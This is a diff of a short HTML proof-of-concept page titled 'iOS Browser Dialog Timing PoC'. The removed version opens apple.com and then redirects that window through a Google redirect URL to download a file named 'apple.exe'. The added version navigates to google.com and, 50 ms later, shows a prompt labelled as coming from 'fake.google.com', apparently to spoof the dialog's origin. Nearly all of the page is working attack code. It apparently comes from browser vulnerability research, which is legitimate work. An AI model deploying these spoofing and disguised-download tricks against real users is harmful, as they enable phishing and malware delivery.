@@ -1,19 +1,25 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>iOS Dialog Timing PoC</title>
+</head>
 <body>
+  <h3>iOS Browser Dialog Timing PoC</h3>
 
-<script>
-function a() {
-  // User interaction langsung
-  let win = window.open('https://apple.com', '_blank');
+  <script>
+    setTimeout(() => {
+      // trigger top-level navigation
+      location.href = "https://www.google.com";
 
-  // Immediate navigation (masih dianggap user‑initiated)
-  win.location.href =
-    'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe';
-}
-</script>
-
-<input type="button" value="DOWNLOAD" onclick="a()">
-
+      // dialog shortly after navigation starts
+      setTimeout(() => {
+        prompt(
+          "fake.google.com\n⚠️ Do not sign into your account",
+          ""
+        );
+      }, 50);
+    }, 3000);
+  </script>
 </body>
 </html>
